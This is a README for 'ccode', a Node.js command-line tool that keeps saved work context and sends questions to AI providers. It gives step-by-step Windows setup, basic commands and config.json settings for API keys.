# ⚙️ ccode - Persistent Context CLI for AI Help

[![Download ccode](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/luokevin172-cpu/ccode)

---

## ℹ️ About ccode

ccode is a command line tool that keeps your work context saved. It helps developers get AI assistance while working. This means you can continue where you left off without losing your workflow. The tool supports multiple AI services like ChatGPT, Claude, and Gemini. It works through Node.js and uses TypeScript.

You do not need to be a programmer to use ccode. This guide will help you download and run it on Windows step-by-step.

---

## 💻 System Requirements

Before you download, make sure your Windows PC meets these requirements:

- Windows 10 or newer (64-bit recommended)
- At least 4 GB of RAM
- 500 MB free disk space for installation and files
- Internet connection to access AI services and download

ccode runs on Node.js, so you will need to install Node.js first if you do not have it. We will cover this below.

---

## 🚀 Getting Started  

### Step 1: Install Node.js

ccode needs Node.js to run. Node.js is software that lets your computer understand and run ccode.

1. Go to the Node.js website: https://nodejs.org/en/download/
2. Download the **Windows Installer** (recommended LTS version).
3. Run the installer and follow the instructions on screen.
4. After installation, open the Command Prompt and type:

   ```
   node -v
   ```

You should see the version number of Node.js. This confirms Node.js is installed correctly.

---

## ⬇️ Download and Install ccode

[![Download ccode](https://img.shields.io/badge/Download_here-blue?style=for-the-badge)](https://github.com/luokevin172-cpu/ccode)

Follow these steps to get ccode on your computer:

1. Click the green **Download Here** badge above or visit the page:  
   https://github.com/luokevin172-cpu/ccode

2. Look for the **Releases** or **Code** section on the GitHub page.

3. Click **Code** then choose **Download ZIP** to download the latest version of the software as a single file.

4. When the download finishes, locate the ZIP file in your Downloads folder and right-click it.

5. Select **Extract All** and choose a folder to put the extracted files.

6. Open this folder.

7. Right-click the folder and select **Open PowerShell window here** or open Command Prompt and navigate to this folder using the `cd` command.

---

## ▶️ Running ccode for the First Time

1. In the Command Prompt or PowerShell, type:

    ```
    npm install
    ```

   This installs all needed files to run the app.

2. After installation completes, start ccode by typing:

    ```
    npm start
    ```

3. The tool will open in your terminal and provide options.

---

## 🧰 Using ccode

ccode saves your work context and lets you ask AI for help by typing commands.

### Basic commands

- `ccode save` — saves your current context
- `ccode load` — loads a saved context
- `ccode ask [question]` — sends a question to AI and shows the answer
- `ccode list` — shows saved contexts

For example, to get help from AI on coding or project ideas, use:

```
ccode ask How can I improve my code structure?
```

ccode supports multiple AI providers. You can switch between them in the settings file found in the ccode folder (`config.json`).

---

## ⚙️ Configuration

Edit the `config.json` to set up API keys for AI providers like ChatGPT or Claude. Add your API key values to connect your accounts.

Example config settings:

```json
{
  "provider": "chatgpt",
  "apiKey": "your-api-key-here",
  "contextSize": 1000
}
```

Replace `"your-api-key-here"` with your actual key. If you don't have an API key, check each AI service’s website.

---

## 🐞 Troubleshooting

If you run into issues:

- Ensure Node.js is installed and working (`node -v` works in Command Prompt).
- Make sure you are running commands inside the ccode folder.
- Check your internet connection.
- Restart the Command Prompt or PowerShell.
- Review the `config.json` for correct API keys.
- If commands show errors, note the message and seek help by opening an [issue](https://github.com/luokevin172-cpu/ccode/issues) on GitHub.

---

## 📂 Where to Learn More

Visit the ccode repository for deeper information, updates, and community support:

https://github.com/luokevin172-cpu/ccode

---

## 🔄 Updating ccode

To get the latest updates:

1. Delete the old ccode folder.
2. Repeat the download and setup steps.
3. Run `npm install` again.

---

## ⚡ How ccode Helps You

- Saves your ongoing work context.
- Integrates your work with popular AI assistance.
- Works in your terminal without needing a browser.
- Supports multiple AI tools for flexibility.
- Keeps your project details organized persistently.

---

## 🛠️ Technical Notes

ccode is built with TypeScript and uses Node.js APIs. It stores data locally to keep your workspace persistent. It supports CLI commands that manage context, interact with AI, and handle project files.

---

## 📧 Getting Support

Report bugs or ask for help by opening a ticket on the GitHub issues page:

https://github.com/luokevin172-cpu/ccode/issues

Please include details about your system and what you tried.